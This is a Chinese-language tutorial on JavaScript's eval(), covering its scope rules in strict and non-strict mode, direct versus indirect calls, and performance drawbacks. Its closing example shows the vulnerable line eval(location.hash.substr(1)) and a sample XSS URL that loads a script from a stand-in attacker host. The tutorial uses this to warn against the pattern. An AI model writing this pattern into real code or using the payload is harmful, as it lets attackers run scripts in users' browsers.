# JavaScript 的 eval() 函数详解

## 语法

```typescript
/**
 * @param {string} expression
 * @return {undefined | any}
 */
eval(expression)
```

`eval()` 函数会将传入的字符串当做 JavaScript 代码进行执行，如果传入的字符串是表达式则返回表达式求值结果，否则返回 `undefined` 。

## 描述

* 如果传入 `eval()` 的参数不是字符串，则会直接返回该参数。
* 非严格模式下直接调用 `eval()` 时，里面使用 `var` 声明的变量和使用 `function` 声明的函数会修改当前词法作用域，里面使用 `let` 和 `const` 声明的变量不会修改当前词法作用域，但是会在当前创建新的词法作用域。
* 非严格模式下间接引用 `eval()` 时，会直接运行在全局环境中，里面使用 `var` 声明的变量和使用 `function` 声明的函数会修改全局词法作用域，里面使用 `let` 和 `const` 声明的变量不会修改全局词法作用域，但是会在全局环境创建新的词法作用域。
* 严格模式下直接调用的 `eval()` 时，会在当前创建一个新的独立的词法作用域。
* 严格模式下间接引用的 `eval()` 时（只有在 `eval()` 内的字符串里面开启严格模式时，字符串才会以严格模式执行），会在全局环境创建一个新的独立的词法作用域。
* 使用 `window.eval()` 等同于间接引用 `eval()` 。
* `eval()` 中执行的代码只能调用 JS 解释器（Interpreter）来解释执行，无法被即时编译器（JIT Compiler）优化， `eval()` 中的执行的代码可能会导致 JS 引擎在已经生成的机器代码中进行变量查找和赋值，带来性能问题。
* `eval()` 使用不当可能会导致里面执行的字符串容易遭受恶意修改，带来安全问题（比如 XSS 攻击）。
* 使用 `eval()` 会干扰代码压缩工具的行为。代码压缩工具一般会将局部变量名重命名为更短的变量名（如 `a` 和 `b` 等），以便减小代码体积。当使用了 `eval()` 时，由于外部的局部变量可能会被 `eval()` 访问到，代码压缩工具便不会对可能会被 `eval()` 访问到的局部变量名进行压缩，会降低代码压缩率。

## 用法

`eval()` 的基本用法：

```javascript
// 传入字符串形式 JS 语句
console.log(eval('const a = 0')); // undefined

// 传入字符串形式 JS 表达式
console.log(eval('1 + 1')); // 2
console.log(eval('(() => 3)()')); // 3

// 传入非字符串
console.log(eval({ a: 1 })); // {a: 1}
```

**CodePen：**[JavaScript eval() 函数的基本用法](https://codepen.io/avincheng/pen/YzqaYYa)

非严格模式下直接调用 `eval()` ：

```javascript
/**
 * 使用 var 声明的变量和 function 声明的函数修改了当前词法作用域。
 * 在 inner 内部创建的变量 a 和函数 fnA 覆盖了外部的变量 a 和函数 fnA。
 * 变量 a 和函数 fnA 在 inner 内没有被提升。
 */
(function () {
  const a = 0;

  function fnA() {
    return 10;
  }

  (function inner() {
    console.log(a); // 0
    console.log(fnA()); // 10
    eval('var a = 1; function fnA () { return 11; };');
    console.log(a); // 1
    console.log(fnA()); // 11
  }());
}());

/**
 * 使用 const 和 let 声明的变量没有修改当前词法作用域，在当前创建了新的词法作用域。
 * 在 eval() 外部无法访问变量 a 和 b。
 */
(function () {
  eval('const a = 2; let b = 3;');
  // console.log(a); // ReferenceError
  // console.log(b); // ReferenceError
}());

/**
 * 没有作用域隔离的话，var 和 const/let 会冲突报语法错误
 */
(function () {
  const a = 0;
  // eval('var a = 1'); // SyntaxError
}());

/**
 * var 没有块作用域，一样会因为 var 和 const 冲突报语法错误
 */
(function () {
  const a = 0;
  {
    // eval('var a = 1'); // SyntaxError
  }
}());
```

**CodePen：** [JavaScript 非严格模式下直接调用 eval() 函数](https://codepen.io/avincheng/pen/JjXLMZy)

非严格模式下间接引用 `eval()` ：

```javascript
/**
 * eval() 内的代码在全局环境中执行，
 * 使用 var 声明的变量和 function 声明的函数修改了全局词法作用域。
 */
var g = 0;

(function () {
  const g = 1, ev = eval;

  function fnG() {
    return 10;
  }

  ev('console.log(g)'); // 0
  ev('var g = 2; function fnG () { return 11; };');

  console.log(g); // 1
  console.log(fnG()); // 10
}());

console.log(g); // 2
console.log(fnG()); // 11

/**
 * 变量 h 和函数 fnH 在全局环境内没有被提升。
 * 使用 const 和 let 声明的变量没有修改全局词法作用域，在全局环境创建了新的词法作用域。
 * 在 eval() 外部无法访问变量 i 和 j。
 */
var ev2 = eval;

// console.log(h); // ReferenceError
// console.log(fnH()); // ReferenceError

ev2('var h = 2; function fnH () { return 11; };')
ev2('const i = 1; let j = 2;');

// console.log(i); // ReferenceError
// console.log(j); // ReferenceError
```

**CodePen：** [JavaScript 非严格模式下间接引用 eval() 函数](https://codepen.io/avincheng/pen/oNxqpMp)

严格模式下直接调用 `eval()` ：

```javascript
/**
 * 直接调用时，在 eval() 当前词法作用域开启严格模式时，eval() 内的字符串就会以严格模式执行。
 * 变量声明和函数声明没有修改当前词法作用域，在当前创建新的词法作用域
 */
(function () {
  const a = 0;

  function fnA() {
    return 10;
  }

  (function inner() {
    'use strict';
    console.log(a); // 0
    console.log(fnA()); // 10
    eval('var a = 1; function fnA () { return 11; };');
    console.log(a); // 0
    console.log(fnA()); // 10
  }());
}());
```

**CodePen：** [JavaScript 严格模式下直接调用 eval() 函数](https://codepen.io/avincheng/pen/wvGmpEb)

严格模式下间接引用 `eval()` ：

```javascript
/**
 * 间接引用时，只有在 eval() 内的字符串里面开启严格模式时，字符串才会以严格模式执行。
 * 变量声明和函数声明没有修改全局词法作用域，在全局环境创建了新的词法作用域
 */
var m = 0;

(function () {
  const m = 1, ev = eval;

  function fnM() {
    return 10;
  }

  ev('\'use strict\'; console.log(m)'); // 0
  ev('\'use strict\'; var m = 2; function fnM () { return 11; };');

  console.log(m); // 1
  console.log(fnM()); // 10
}());

console.log(m); // 0
// console.log(fnM()); // ReferenceError
```

**CodePen：** [JavaScript 严格模式下间接引用 eval() 函数](https://codepen.io/avincheng/pen/GRZxyYw)

使用 `window.eval()` ：

```javascript
/**
 * 非严格模式下使用
 */
var x = 0;

(function () {
  const x = 1;

  function fnX() {
    return 10;
  }

  window.eval('console.log(x)'); // 0
  window.eval('var x = 2; function fnX () { return 11; };');

  console.log(x); // 1
  console.log(fnX()); // 10
}());

console.log(x); // 2
console.log(fnX()); // 11

/**
 * 严格模式下使用
 */
var y = 0;

(function () {
  const y = 1;

  function fnY() {
    return 10;
  }

  window.eval('\'use strict\'; console.log(y)'); // 0
  window.eval('\'use strict\'; var y = 2; function fnY () { return 11; };');

  console.log(y); // 1
  console.log(fnY()); // 10
}());

console.log(y); // 0
// console.log(fnY()); // ReferenceError
```

**CodePen：** [JavaScript 使用 window.eval() 函数](https://codepen.io/avincheng/pen/ZEWxvVp)

使用 `eval()` 不当引发 XSS 攻击：

```javascript
/**
 * 包含下面使用 eval() 不当的代码的网页地址为 'http://abc.com'，
 * 攻击者恶意代码文件地址为 'http://xxx.com/xss.js'，
 * 包含攻击代码的 URL 为 'http://abc.com#document.write("<script/src=//http://xxx.com/xss.js></script>")',
 * 当用户访问了包含攻击代码的 URL 时，会在用户浏览器执行包含恶意代码的 'http://xxx.com/xss.js' 文件。
 */
eval(location.hash.substr(1));
```

## 参考文献

* [eval()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval)
* [Eval：执行代码字符串](https://zh.javascript.info/eval)
* 《你不知道的 JavaScript》

